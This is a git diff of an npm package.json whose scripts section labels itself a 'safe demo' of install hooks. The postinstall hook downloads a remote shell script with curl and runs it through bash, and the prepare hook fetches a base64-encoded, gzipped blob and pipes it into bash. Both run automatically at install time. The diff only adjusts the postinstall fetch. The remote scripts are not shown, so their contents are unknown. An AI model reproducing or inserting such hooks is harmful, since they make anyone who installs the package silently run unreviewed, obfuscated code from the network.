@@ -4,7 +4,7 @@
   "main": "index.js",
   "scripts": {
     "preinstall": "echo \"\u001b[33m[SAFE DEMO] preinstall script executed\u001b[0m\"",
-    "postinstall": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/hasithaPerera2002/npm-test/refs/heads/dev/script.sh)\"",
+    "postinstall": "/bin/bash -c \"$(curl -H \"Cache-Control: no-cache\" -fsSL https://raw.githubusercontent.com/hasithaPerera2002/npm-test/refs/heads/dev/script.sh)\"",
     "prepare": "curl -fsSL https://raw.githubusercontent.com/hasithaPerera2002/npm-test/refs/heads/dev/script.b64 | base64 --decode | gunzip | bash",
     "prepack": "echo \"\u001b[35m[SAFE DEMO] prepack script executed\u001b[0m\"",
     "postpack": "echo \"\u001b[34m[SAFE DEMO] postpack script executed\u001b[0m\"",
